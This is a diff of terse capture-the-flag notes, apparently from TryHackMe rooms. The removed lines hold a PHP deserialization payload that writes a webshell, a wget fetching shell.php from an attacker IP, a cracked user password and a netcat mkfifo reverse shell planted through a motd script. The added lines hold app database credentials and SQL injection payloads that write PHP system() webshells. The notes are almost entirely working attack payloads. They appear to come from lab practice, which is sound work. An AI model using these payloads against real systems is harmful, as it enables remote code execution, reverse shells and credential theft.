@@ -26,14 +26,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## HTTP (port 80)
 
-http://debug.thm/index.php?debug=O:10:%22FormSubmit%22:2:{s:9:%22form_file%22;s:16:%22backup/test2.php%22;s:7:%22message%22;s:27:%22%3C?php%20system($_GET[%22cmd%22]);%22;}
-http://debug.thm/backup/test2.php?cmd=wget%20http://10.8.72.209:8000/shell.php
-http://debug.thm/backup/shell.php
-
-jamaica          (james)
-
-<img width="1222" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/c969f1e0-2854-4741-9b95-c7df0798a8bc">
+$db_server="localhost";
+$db_username="clicker_db_user";
+$db_password="clicker_db_password";
+$db_name="clicker";
 
 
-we can edit /etc/update-motd.d/00-header
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
+1 UNION SELECT REPLACE(nickname, 'mateor', '<?php echo system($_GET[0]); ?>'), clicks, level FROM players
+
+9999999999999999999 UNION SELECT '<?php phpinfo(); ?>', 2, 3 from players
+999999999999999999
+extension: php
